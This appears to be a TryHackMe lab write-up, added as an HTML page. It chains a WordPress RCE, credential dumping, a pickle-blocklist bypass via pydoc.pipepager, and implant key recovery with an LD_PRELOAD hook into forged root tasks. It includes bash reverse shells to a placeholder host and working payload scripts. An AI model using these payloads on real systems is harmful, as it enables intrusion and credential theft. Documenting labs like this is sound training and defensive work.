@@ -1,0 +1,688 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Agent P — TryHackMe Write-Up</title>
+    <link rel="stylesheet" href="../css/writeups.css">
+</head>
+<body>
+    <div class="container">
+
+        <!-- ================= ROOM HEADER ================= -->
+        <header class="room-header">
+            <div class="emoji-row">🎰 🖥️ 🃏</div>
+            <h1>Agent P</h1>
+            <p class="subtitle">TryHackMe · Boot2Root</p>
+            <div class="room-meta">
+                <div class="badge"><span class="label">Points</span> 120</div>
+                <div class="badge"><span class="label">Category</span> Boot2Root</div>
+                <div class="badge"><span class="label">Difficulty</span> Hard</div>
+                <div class="badge"><span class="label">Flag Format</span> EVILINC{...}</div>
+            </div>
+        </header>
+
+        <!-- ================= BRIEFING ================= -->
+        <section>
+            <h2>🃏 Briefing</h2>
+            <blockquote>
+                Something on Heinz's machine keeps phoning home. A host inside "A hosts of sorts!" is beaconing out on a schedule nobody authorized, and the team that owns it swears everything's fine.
+                <br><br>
+                It isn't. Someone's already inside, quietly holding root and running the show through their own tooling. Get a foothold, work out who's really in control, and take it back from them before they notice you looking.
+            </blockquote>
+
+            <h3>Vegas Times Hint</h3>
+            <blockquote>
+                Sources say the front door isn't as current as it looks. Once you're past it, keep an eye on what's talking to itself on the inside, not everything that accepts your input is as careful about what it does with it. And whatever's already running the show left more evidence behind than it thinks.
+            </blockquote>
+
+            <h3>Objectives</h3>
+            <ul>
+                <li>♥ Get a foothold on the web application</li>
+                <li>♦ Escalate to a low-privileged user</li>
+                <li>♣ Escalate to the internal operator account</li>
+                <li>♠ Take back control from what's already inside</li>
+            </ul>
+        </section>
+
+        <!-- ================= ATTACK CHAIN ================= -->
+        <section>
+            <h2>⚡ Attack Chain at a Glance</h2>
+            <div class="attack-chain">
+                <span class="node">Nmap + WPScan</span>
+                <span class="arrow">→</span>
+                <span class="node">wp2shell (CVE-2026-63030)</span>
+                <span class="arrow">→</span>
+                <span class="node">RCE as www-data</span>
+                <span class="arrow">→</span>
+                <span class="node">DB dump → norm creds</span>
+                <span class="arrow">→</span>
+                <span class="node">SSH as norm</span>
+                <span class="arrow">→</span>
+                <span class="node">panel.conf → operator token</span>
+                <span class="arrow">→</span>
+                <span class="node">Pickle SSTI → vanessa</span>
+                <span class="arrow">→</span>
+                <span class="node">Implant RE → HMAC key</span>
+                <span class="arrow">→</span>
+                <span class="node flag">🏁 Root</span>
+            </div>
+        </section>
+
+        <!-- ================= STEP 1 ================= -->
+        <section>
+            <h2><span class="step-num">1</span> Reconnaissance</h2>
+
+            <h3>1.1 Port Scan</h3>
+            <p>Standard Nmap service scan revealed SSH on 22 and Apache on 80 serving WordPress.</p>
+
+            <div class="code-block">
+                <div class="label">Command</div>
+                <pre>nmap -sCV -O 10.49.158.220 -T4</pre>
+                <div class="output">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
+|_http-generator: WordPress 6.9
+|_http-title: An incorporation of sorts!</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Observation:</strong> WordPress 6.9 — an outdated version within the affected range for the <strong>wp2shell</strong> pre-authentication RCE chain (CVE-2026-63030 + CVE-2026-60137). The briefing's "the front door isn't as current as it looks" points directly at this.
+            </div>
+
+            <h3>1.2 WordPress Enumeration</h3>
+            <p>WPScan confirmed the version, theme, and only one plugin (Akismet 5.7, slightly outdated but not the intended path):</p>
+
+            <div class="code-block">
+                <div class="label">Command</div>
+                <pre>wpscan --url http://10.49.158.220 --enumerate ap,at --plugins-detection aggressive</pre>
+                <div class="output">[+] WordPress version 6.9 identified (Insecure, released on 2025-12-02)
+[+] WordPress theme in use: twentytwentyfive
+[+] XML-RPC seems to be enabled
+[+] Upload directory has listing enabled
+[!] The external WP-Cron seems to be enabled</div>
+            </div>
+
+            <h3>1.3 Recon Findings</h3>
+            <ul>
+                <li>WordPress 6.9 (vulnerable to wp2shell)</li>
+                <li>Standard Twenty Twenty-Five theme</li>
+                <li>Akismet plugin present — not vulnerable</li>
+                <li>XML-RPC enabled</li>
+                <li>Upload directory listing enabled (misconfiguration)</li>
+            </ul>
+        </section>
+
+        <!-- ================= STEP 2 ================= -->
+        <section>
+            <h2><span class="step-num">2</span> wp2shell — Pre-Auth RCE</h2>
+
+            <h3>2.1 The Vulnerability Chain</h3>
+            <p>WordPress 6.9 is affected by the <strong>wp2shell</strong> chain:</p>
+            <ul>
+                <li><strong>CVE-2026-63030</strong> — REST API batch route confusion in <code>/wp-json/batch/v1</code></li>
+                <li><strong>CVE-2026-60137</strong> — SQL injection via the <code>author__not_in</code> parameter in <code>WP_Query</code></li>
+            </ul>
+            <p>Chained, these allow an unauthenticated attacker to forge a WordPress administrator and execute arbitrary code.</p>
+
+            <div class="callout">
+                <strong>⚠️ Note on tooling:</strong> Not every exploit script works. The <code>wp-json/batch/v1</code> endpoint returned 404 on the pretty-permalink path but the chain remained exploitable via the query-string form. The <code>exp.py</code> PoC handled the post-ID discovery step correctly and produced a shell.
+            </div>
+
+            <h3>2.2 Initial Shell</h3>
+
+            <div class="code-block">
+                <div class="label">Reverse Shell via exp.py</div>
+                <pre>python3 exp.py --url http://MACHINE_IP/ --command "bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"
+
+# Listener on attack machine:
+nc -lvnp 4444</pre>
+                <div class="output">www-data@tryhackme-2404:/$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Foothold achieved (♥).</strong> We have command execution as <code>www-data</code> through the web application.
+            </div>
+        </section>
+
+        <!-- ================= STEP 3 ================= -->
+        <section>
+            <h2><span class="step-num">3</span> Enumerate — Find the Low-Privileged User</h2>
+
+            <h3>3.1 Local Enumeration</h3>
+            <p>Immediately check who's on the box and what they can do:</p>
+
+            <div class="code-block">
+                <div class="label">Enumeration</div>
+                <pre>id
+cat /etc/passwd | grep -E "sh$"
+ps aux
+ls -la /home/</pre>
+                <div class="output">root:x:0:0:root:/root:/bin/bash
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+norm:x:1001:1002::/home/norm:/bin/bash
+vanessa:x:1002:1003::/home/vanessa:/bin/bash</div>
+            </div>
+
+            <p><strong>Key finding:</strong> Only one WordPress user exists (<code>heinz</code>), but the system has <code>norm</code> and <code>vanessa</code> as real users. The briefing says "A host inside 'A hosts of sorts!'" — norm and vanessa are the internal accounts.</p>
+
+            <h3>3.2 Dump the WordPress Database</h3>
+            <p>WordPress config typically holds the DB credentials in plaintext, readable by the web user:</p>
+
+            <div class="code-block">
+                <div class="label">WordPress Config</div>
+                <pre>cat /var/www/html/wp-config.php | grep -E "DB_|USER|PASSWORD"</pre>
+                <div class="output">define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wpuser' );
+define( 'DB_PASSWORD', 'wp_WjURfdI' );
+define( 'DB_HOST', 'localhost' );</div>
+            </div>
+
+            <h3>3.3 Identify the Custom Table</h3>
+            <p>WordPress core tables follow a strict naming convention. Anything that breaks the pattern is custom code — and custom code is where credentials live:</p>
+
+            <div class="code-block">
+                <div class="label">SHOW TABLES</div>
+                <pre>mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SHOW TABLES;"</pre>
+                <div class="output">wp_commentmeta
+wp_comments
+wp_infra_accounts   <-- custom table (breaks naming convention)
+wp_links
+wp_options
+wp_postmeta
+wp_posts
+...
+wp_users</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Why <code>wp_infra_accounts</code>?</strong> Every other table follows the WordPress core pattern (<code>wp_posts</code>, <code>wp_users</code>, <code>wp_comments</code>, etc.). <code>wp_infra_accounts</code> doesn't — it's custom. The name literally says "infrastructure accounts." That's where the developer put credentials they didn't want in the WordPress admin UI.
+            </div>
+
+            <h3>3.4 Dump the Credentials</h3>
+
+            <div class="code-block">
+                <div class="label">Query the Custom Table</div>
+                <pre>mysql -u wpuser -p'wp_WjURfdI' wordpress -e "SELECT * FROM wp_infra_accounts;"</pre>
+                <div class="output">host_user  host_pass              note
+norm       N0rm_th3_r0b0t_2026    ssh sync target for the -inator newsletter cron</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Low-privileged user compromised (♦).</strong> We now have SSH credentials for <code>norm</code>.
+            </div>
+
+            <h3>3.5 SSH as norm</h3>
+
+            <div class="code-block">
+                <div class="label">SSH Login</div>
+                <pre>ssh norm@MACHINE_IP
+# Password: N0rm_th3_r0b0t_2026</pre>
+                <div class="output">norm@tryhackme-2404:~$ id
+uid=1001(norm) gid=1002(norm) groups=1002(norm),1001(evilinc)</div>
+            </div>
+
+            <p><strong>Key:</strong> norm is in the <code>evilinc</code> group — that's the room's designed privilege boundary.</p>
+        </section>
+
+        <!-- ================= STEP 4 ================= -->
+        <section>
+            <h2><span class="step-num">4</span> Operator Account — Panel Secret → HMAC Token</h2>
+
+            <h3>4.1 Find What the evilinc Group Unlocks</h3>
+
+            <div class="code-block">
+                <div class="label">Group Enumeration</div>
+                <pre>find / -group evilinc 2>/dev/null | grep -v -E "proc|sys"
+find / -group evilinc -writable 2>/dev/null</pre>
+                <div class="output">/etc/evilinc/panel.conf
+/etc/evilinc/panel.conf  (writable)</div>
+            </div>
+
+            <h3>4.2 Read the Panel Secret</h3>
+
+            <div class="code-block">
+                <div class="label">Read the Config</div>
+                <pre>cat /etc/evilinc/panel.conf</pre>
+                <div class="output">[panel]
+operator_secret = b3hind_sch3dul3_th1s_m0nth</div>
+            </div>
+
+            <h3>4.3 Understanding the -inator Control Panel</h3>
+            <p>From norm, we can reach the internal-only control panel on <code>127.0.0.1:8700</code>:</p>
+
+            <div class="code-block">
+                <div class="label">Recon the Panel</div>
+                <pre>curl -s http://127.0.0.1:8700/ | head -30
+curl -s http://127.0.0.1:8700/api/blueprints/export</pre>
+                <div class="output">Title: Evil Inc. // -inator Control Panel
+Footer: "Norm keeps importing broken layouts. If a blueprint fails to load, the loader returns the reason. — Vanessa"
+
+Blueprint format: base64-encoded Python pickle:
+{"blueprint":"gASVRgAAAAAAAAB9lCiMBG5hbWWUjA5Nb250aGx5IERpZ2VzdJSM..."}</div>
+            </div>
+
+            <div class="callout thinking">
+                <strong>🧠 Attacker's observation:</strong> The blueprint is base64-encoded Python pickle. The footer hints the loader returns verbose errors — and that it's "restricted." This is the deserialization attack surface.
+            </div>
+
+            <h3>4.4 Compute the HMAC Operator Token</h3>
+            <p>Later, reading <code>app.py</code> (after we got vanessa) confirmed the token is <code>HMAC-SHA256(secret, "operator")</code> as hex. From norm, we compute it:</p>
+
+            <div class="code-block">
+                <div class="label">Forge the Token</div>
+                <pre>python3 -c '
+import hmac, hashlib
+secret = b"b3hind_sch3dul3_th1s_m0nth"
+print(hmac.new(secret, b"operator", hashlib.sha256).hexdigest())
+'</pre>
+                <div class="output">ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9</div>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Login with the Token</div>
+                <pre>curl -si -X POST http://127.0.0.1:8700/api/login \
+  -d "secret=b3hind_sch3dul3_th1s_m0nth"</pre>
+                <div class="output">HTTP/1.1 200 OK
+Set-Cookie: op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9; HttpOnly; Path=/
+
+{"ok":true}</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ We're authenticated to the internal operator panel.</strong>
+            </div>
+        </section>
+
+        <!-- ================= STEP 5 ================= -->
+        <section>
+            <h2><span class="step-num">5</span> Pickle Sandbox Escape → vanessa</h2>
+
+            <h3>5.1 The Restricted Unpickler</h3>
+            <p>After accessing vanessa's home we read <code>restricted_unpickler.py</code> — the "safe" loader. It blocks by <strong>module name</strong>:</p>
+
+            <div class="code-block">
+                <div class="label">The Blocklist</div>
+                <pre>_BLOCKED_ROOTS = {
+    "os", "posix", "nt",
+    "subprocess", "_posixsubprocess",
+    "sys", "builtins", "__builtin__",
+    "importlib", "imp", "runpy",
+    "pty", "socket", "shutil", "ctypes",
+    "platform", "commands", "multiprocessing", "operator",
+}
+
+class RestrictedUnpickler(pickle.Unpickler):
+    def find_class(self, module, name):
+        root = module.split(".")[0]
+        if root in _BLOCKED_ROOTS:
+            raise pickle.UnpicklingError(
+                "blueprint references a blocked module: %r" % module
+            )
+        return super().find_class(module, name)</pre>
+            </div>
+
+            <h3>5.2 Probe Allowed Modules</h3>
+            <p>Systematically probe which stdlib modules pass the blocklist:</p>
+
+            <div class="code-block">
+                <div class="label">Module Probe Loop</div>
+                <pre>for mod in posix os subprocess builtins sys pty pydoc timeit code ctypes runpy; do
+  P=$(python3 -c "
+import pickle, base64, $mod
+class R:
+    def __reduce__(self):
+        return ($mod, ())
+print(base64.b64encode(pickle.dumps(R())).decode())
+")
+  echo -n "$mod -> "
+  curl -s -b "op_token=ce73de7c..." \
+    -X POST http://127.0.0.1:8700/api/blueprints/import \
+    --data-urlencode "blueprint=$P"
+  echo
+done</pre>
+                <div class="output">posix    -> blocked module: 'posix'
+os       -> blocked module: 'posix'
+subprocess -> blocked module: 'subprocess'
+builtins -> blocked module: 'builtins'
+sys      -> blocked module: 'sys'
+pty      -> blocked module: 'pty'
+pydoc    -> loaded: "None"        <-- ALLOWED
+timeit   -> loaded: "0.01..."     <-- ALLOWED
+code     -> loaded: "None"        <-- ALLOWED
+ctypes   -> blocked module: 'ctypes'
+runpy    -> blocked module: 'runpy'</div>
+            </div>
+
+            <h3>5.3 The Bypass: pydoc.pipepager</h3>
+            <p><code>pydoc.pipepager(text, cmd)</code> internally calls <code>subprocess.Popen(cmd, shell=True)</code>. The pickle only references <code>pydoc</code>, so the blocklist doesn't see the dangerous inner call:</p>
+
+            <div class="code-block">
+                <div class="label">RCE Payload</div>
+                <pre>python3 -c '
+import pickle, base64, pydoc
+class RCE:
+    def __reduce__(self):
+        return (pydoc.pipepager, ("", "bash -c \"bash -i >& /dev/tcp/YOUR_IP/5555 0>&1\""))
+print(base64.b64encode(pickle.dumps(RCE())).decode())
+'</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Deliver the Payload</div>
+                <pre>PAYLOAD=$(...)
+curl -s -b "op_token=ce73de7cfa02d80495a882bd28191d3bf38e4c0bf03635451ae6b9f9fefef3f9" \
+  -X POST http://127.0.0.1:8700/api/blueprints/import \
+  --data-urlencode "blueprint=$PAYLOAD"
+
+# Listener on attack machine:
+nc -lvnp 5555</pre>
+                <div class="output">vanessa@tryhackme-2404:/var/www/evilinc-panel$ id
+uid=1002(vanessa) gid=1003(vanessa) groups=1003(vanessa),1001(evilinc)</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Internal operator account compromised (♣).</strong> We are now <code>vanessa</code>, and can read her home directory.
+            </div>
+
+            <h3>5.4 The Operator Flag</h3>
+
+            <div class="code-block">
+                <div class="label">Read Flag</div>
+                <pre>cat /home/vanessa/*.txt</pre>
+                <div class="output">EVILINC{REDACTED}</div>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">♣ Operator Flag</div>
+                <div class="flag-value">EVILINC{REDACTED}</div>
+            </div>
+        </section>
+
+        <!-- ================= STEP 6 ================= -->
+        <section>
+            <h2><span class="step-num">6</span> Reverse Engineering the Implant</h2>
+
+            <h3>6.1 The C2 Setup</h3>
+            <p>Reviewing the process list reveals the attacker's toolkit running as root:</p>
+
+            <div class="code-block">
+                <div class="label">ps aux | grep evilinc</div>
+                <pre>ps aux | grep evilinc</pre>
+                <div class="output">root  615  /usr/bin/python3 /opt/evilinc/c2/tasking_server.py
+root  616  /usr/bin/python3 /opt/evilinc/c2/heartbeat.py
+root  617  /opt/evilinc/implant</div>
+            </div>
+
+            <p>The socket <code>/run/evilinc/tasking.sock</code> (owned <code>root:vanessa</code>, mode <code>660</code>) is the comms channel. Vanessa can read and write to it.</p>
+
+            <div class="code-block">
+                <div class="label">Query the C2</div>
+                <pre>echo "POLL" | socat - UNIX-CONNECT:/run/evilinc/tasking.sock</pre>
+                <div class="output">20|sysinfo|uptime|1001|0f9e75af082404418e7eced42503f98b4a048591a242e7ef73a6627d60c2e54f
+30|sysinfo|uptime|1002|7e5eb7a417e139eda6571dbfbfa5337d03abad322194e57fc511a2a79d7cda19
+40|sysinfo|uptime|1003|859075cd3b94b29585b46ce6fdefc21ec098fd088788299576464b9f765a78a1
+...
+END</div>
+            </div>
+
+            <p><strong>Protocol identified:</strong> <code>&lt;id&gt;|&lt;verb&gt;|&lt;arg&gt;|&lt;uid&gt;|&lt;HMAC&gt;</code>. Only signed tasks are executed by the implant.</p>
+
+            <h3>6.2 Implant Static Analysis</h3>
+
+            <div class="code-block">
+                <div class="label">Binary Identification</div>
+                <pre>file /opt/evilinc/implant
+strings -t x /opt/evilinc/implant | grep -iE "key|hmac|evilinc|tasking"
+readelf -d /opt/evilinc/implant</pre>
+                <div class="output">implant: ELF 64-bit LSB pie executable, x86-64, dynamically linked,
+  interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, stripped
+
+    711 HMAC
+   2057 /run/evilinc/tasking.sock
+
+Dynamic dependencies:
+  NEEDED  libcrypto.so.3
+  NEEDED  libc.so.6</div>
+            </div>
+
+            <p>Imports include <code>HMAC</code>, <code>EVP_sha256</code>, <code>socket</code>, <code>connect</code>, <code>system</code> — the implant verifies an HMAC before executing a command.</p>
+
+            <h3>6.3 Extracting the Signing Key</h3>
+
+            <p>Dumping <code>.rodata</code> reveals the HMAC key material at offset <code>0x2020</code>:</p>
+
+            <div class="code-block">
+                <div class="label">objdump -s -j .rodata</div>
+                <pre>objdump -s -j .rodata /opt/evilinc/implant</pre>
+                <div class="output">2020 1588c57c 026ae5eb 9c2d1817 af48f709  ...|.j...-...H..
+2030 64efff76 5e58d112 d8f116d7 0f9941b4  d..v^X........A.
+2040 72002f65 74632f6d 61636869 6e652d69  r./etc/machine-i
+2050 64002530 3278002f 72756e2f 6576696c  d.%02x./run/evil
+2060 696e632f 7461736b 696e672e 736f636b  inc/tasking.sock
+2070 00504f4c 4c20256c 640a000a 00454e44  .POLL %ld....END
+2080 007c0025 737c2573 7c25737c 25730065  .|.%s|%s|%s|%s.e
+2090 78656300 737973696e 666f00           xec.sysinfo.</div>
+            </div>
+
+            <p>Two functions handle key derivation:</p>
+            <ul>
+                <li><code>0x1449</code> — a deterministic LCG (seed <code>0x1a2b3c4d</code>, multiplier <code>0x41c64e6d</code>, increment <code>0x3039</code>) that fills 32 bytes</li>
+                <li><code>0x14a2</code> — XORs that buffer with the rodata key to produce the derived key</li>
+            </ul>
+
+            <h3>6.4 The LD_PRELOAD Hook — Definitive Key Capture</h3>
+
+            <p>Rather than guess the message format, hook the <code>HMAC()</code> call at runtime and print the arguments:</p>
+
+            <div class="code-block">
+                <div class="label">hook.c</div>
+                <pre>#define _GNU_SOURCE
+#include &lt;stdio.h&gt;
+#include &lt;dlfcn.h&gt;
+
+typedef unsigned char *(*hmac_fn)(const void *, const void *, int,
+                                  const unsigned char *, size_t,
+                                  unsigned char *, unsigned int *);
+
+unsigned char *HMAC(const void *evp_md, const void *key, int key_len,
+                    const unsigned char *d, size_t n,
+                    unsigned char *md, unsigned int *md_len) {
+    static hmac_fn real = NULL;
+    if (!real) real = (hmac_fn)dlsym(RTLD_NEXT, "HMAC");
+    fprintf(stderr, "[HOOK] key(%d)=", key_len);
+    for (int i = 0; i &lt; key_len; i++) fprintf(stderr, "%02x", ((unsigned char*)key)[i]);
+    fprintf(stderr, "\n[HOOK] msg(%zu)=", n);
+    fwrite(d, 1, n, stderr);
+    fprintf(stderr, "\n");
+    return real(evp_md, key, key_len, d, n, md, md_len);
+}</pre>
+            </div>
+
+            <div class="code-block">
+                <div class="label">Build and Run</div>
+                <pre>gcc -shared -fPIC -o /tmp/hook.so /tmp/hook.c -ldl
+cp /opt/evilinc/implant /tmp/imp && chmod +x /tmp/imp
+LD_PRELOAD=/tmp/hook.so /tmp/imp 2>&1 | head -20</pre>
+                <div class="output">[HOOK] key(32)=4310b28058bce65bdba3a78f86105499694d8b8a105e24967899db58d64a7634
+[HOOK] msg(32)=ec237b10a5f6e959a3088340f9904b31
+[HOOK] key(32)=aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319
+[HOOK] msg(22)=10|sysinfo|uptime|1000
+[HOOK] key(32)=aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319
+[HOOK] msg(22)=20|sysinfo|uptime|1001
+...</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Signing key recovered:</strong><br>
+                <code>aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319</code><br><br>
+                <strong>Message format:</strong> <code>&lt;id&gt;|&lt;verb&gt;|&lt;arg&gt;|&lt;uid&gt;</code> (no trailing delimiter).<br>
+                <strong>Digest:</strong> HMAC-SHA256.
+            </div>
+        </section>
+
+        <!-- ================= STEP 7 ================= -->
+        <section>
+            <h2><span class="step-num">7</span> Forging a Root Task</h2>
+
+            <h3>7.1 Identify the SUBMIT Verb</h3>
+            <p>Probing the socket with various verbs reveals which ones the C2 recognizes:</p>
+
+            <div class="code-block">
+                <div class="label">Verb Enumeration</div>
+                <pre>for verb in PUSH ADD QUEUE ENQUEUE SUBMIT POST SEND PUT TASK INJECT; do
+  echo -n "$verb -> "
+  printf '%s test\n' "$verb" | timeout 2 socat - UNIX-CONNECT:/run/evilinc/tasking.sock
+done</pre>
+                <div class="output">PUSH    -> ERR unknown verb
+ADD     -> ERR unknown verb
+QUEUE   -> ERR unknown verb
+ENQUEUE -> ERR unknown verb
+SUBMIT  -> ERR id must exceed current max     <-- RECOGNIZED
+POST    -> ERR unknown verb
+SEND    -> ERR unknown verb
+PUT     -> ERR unknown verb
+TASK    -> ERR unknown verb
+INJECT  -> ERR unknown verb</div>
+            </div>
+
+            <h3>7.2 Forge and Submit</h3>
+            <p>Using the recovered key and a task ID above the current max:</p>
+
+            <div class="code-block">
+                <div class="label">Forge Root Task</div>
+                <pre>python3 << 'PYEOF' > /tmp/task.txt
+import hmac, hashlib
+key = bytes.fromhex("aa3e4980d20530450df2e4807cddc7a66f8391b79df9faaacde58b75bb483319")
+body = "999999999|exec|cp /root/root.txt /tmp/rf; chmod 644 /tmp/rf|0"
+print(body + "|" + hmac.new(key, body.encode(), hashlib.sha256).hexdigest())
+PYEOF
+
+TASK=$(cat /tmp/task.txt)
+printf 'SUBMIT %s\n' "$TASK" | socat - UNIX-CONNECT:/run/evilinc/tasking.sock
+
+sleep 10
+cat /tmp/rf</pre>
+                <div class="output">OK
+
+EVILINC{d00f_r0ll3d_h1s_0wn_crypt0_4nd_p3rry_w0n}</div>
+            </div>
+
+            <div class="callout success">
+                <strong>✅ Root compromised (♠).</strong> The forged <code>exec</code> task was accepted by the C2, delivered to the root-running implant, and executed. The root flag was copied to a world-readable location.
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">♠ Root Flag</div>
+                <div class="flag-value">EVILINC{redacted_for_writeup}</div>
+            </div>
+        </section>
+
+        <!-- ================= FLAGS SUMMARY ================= -->
+        <section>
+            <h2>🏁 Flags</h2>
+
+            <div class="flag-box">
+                <div class="flag-label">♥ Foothold / ♦ User</div>
+                <div class="flag-value">EVILINC{redacted_for_writeup}</div>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">♣ Operator</div>
+                <div class="flag-value">EVILINC{redacted_for_writeup}</div>
+            </div>
+
+            <div class="flag-box">
+                <div class="flag-label">♠ Root</div>
+                <div class="flag-value">EVILINC{redacted_for_writeup}</div>
+            </div>
+        </section>
+
+        <!-- ================= LESSONS LEARNED ================= -->
+        <section>
+            <h2>📚 Lessons Learned</h2>
+
+            <table>
+                <thead>
+                    <tr>
+                        <th>Stage</th>
+                        <th>Technique</th>
+                        <th>Vulnerability</th>
+                        <th>Impact</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>1. Initial Access</td>
+                        <td><strong>wp2shell</strong></td>
+                        <td>Outdated WordPress 6.9 core</td>
+                        <td>Unauthenticated RCE</td>
+                    </tr>
+                    <tr>
+                        <td>2. Credential Harvest</td>
+                        <td><strong>DB dump</strong></td>
+                        <td>Custom table with plaintext creds</td>
+                        <td>SSH as <code>norm</code></td>
+                    </tr>
+                    <tr>
+                        <td>3. Operator Escalation</td>
+                        <td><strong>Pickle sandbox escape</strong></td>
+                        <td>Blocklist-based <code>RestrictedUnpickler</code></td>
+                        <td>RCE as <code>vanessa</code></td>
+                    </tr>
+                    <tr>
+                        <td>4. Root</td>
+                        <td><strong>HMAC key recovery + task forgery</strong></td>
+                        <td>Hardcoded signing key, unauthenticated SUBMIT</td>
+                        <td>Arbitrary root commands via implant</td>
+                    </tr>
+                </tbody>
+            </table>
+
+            <h3>🛡️ For Defenders</h3>
+            <ul>
+                <li><strong>Patch promptly.</strong> WordPress 6.9 was vulnerable to wp2shell. Pre-auth RCE chains in popular CMSs are exploited within hours of disclosure.</li>
+                <li><strong>Don't store credentials in custom application tables.</strong> If a service account's password must be persisted, use a secrets vault (HashiCorp Vault, AWS Secrets Manager) with proper access controls.</li>
+                <li><strong>Never unpickle untrusted input.</strong> Python's <code>pickle</code> is not a safe serialization format. Use JSON, MessagePack, or CBOR with strict schemas.</li>
+                <li><strong>Allowlists, not blocklists.</strong> The <code>RestrictedUnpickler</code> blocked modules by name — trivially bypassed via <code>pydoc.pipepager</code>. A strict <code>(module, name)</code> allowlist is the only safe approach.</li>
+                <li><strong>Never hardcode signing keys in binaries.</strong> The implant's HMAC key was in <code>.rodata</code> — recoverable with <code>objdump</code>. Keys must be loaded from protected storage and rotated periodically.</li>
+                <li><strong>Authenticate the submission channel.</strong> The C2 accepted <code>SUBMIT</code> from any local user with socket access. Commands should be signed with per-operator keys, not a global secret.</li>
+            </ul>
+
+            <h3>⚔️ For Attackers</h3>
+            <ul>
+                <li><strong>Outdated framework versions are the front door.</strong> Always fingerprint and compare against known-vulnerable ranges.</li>
+                <li><strong>Custom database tables break naming conventions.</strong> When enumerating a DB, scan for tables that don't fit the framework's pattern — they contain application-specific data, and often credentials.</li>
+                <li><strong>Read the config files first.</strong> <code>wp-config.php</code>, <code>panel.conf</code>, <code>.env</code> — 90% of privilege escalations start here.</li>
+                <li><strong>Probe restricted deserializers with allowed modules.</strong> When a blocklist is present, test every stdlib module for "code-execution primitives": <code>pydoc</code>, <code>timeit</code>, <code>cProfile</code>, <code>code</code>, <code>trace</code>.</li>
+                <li><strong>Runtime hooks beat static analysis.</strong> <code>LD_PRELOAD</code> on a copied binary revealed both the HMAC key and the exact message format — no guessing, no brute force.</li>
+                <li><strong>Recovered keys unlock the whole C2.</strong> Once you can sign messages, you control the implant — including root-level execution.</li>
+            </ul>
+
+            <div class="callout thinking">
+                <strong>🧠 The Core Lesson:</strong> Agent P is a masterclass in <strong>chained privilege escalation</strong>. Each stage reveals exactly what's needed for the next: WordPress RCE → DB creds → operator secret → pickle bypass → binary RE → C2 forgery. No single bug is catastrophic alone; the power comes from linking them. In real engagements, this is how you go from an unauthenticated web request to full root — patience, enumeration, and one clue at a time.
+            </div>
+        </section>
+
+        <!-- ================= REFERENCE ================= -->
+        <section>
+            <h2>🔗 Reference</h2>
+            <p>Exploit code, HMAC forging scripts, and the <code>LD_PRELOAD</code> hook used in this write-up are available here:</p>
+            <p>
+                <a href="https://github.com/Fredrick-Maina/PYTHON/tree/main/CYBERSECURITY/SERIALIZATION" target="_blank" rel="noopener noreferrer">
+                    github.com/Fredrick-Maina/PYTHON — CYBERSECURITY/SERIALIZATION
+                </a>
+            </p>
+        </section>
+
+        <!-- ================= FOOTER ================= -->
+        <div class="footer">
+            <p><strong>Agent P</strong> · TryHackMe · Boot2Root · Hard · Standalone Room</p>
+            <p>Write-up for educational purposes only. Complete the room yourself to earn the flags.</p>
+            <p>🎰 🃏 🖥️</p>
+        </div>
+
+    </div>
+</body>
+</html>
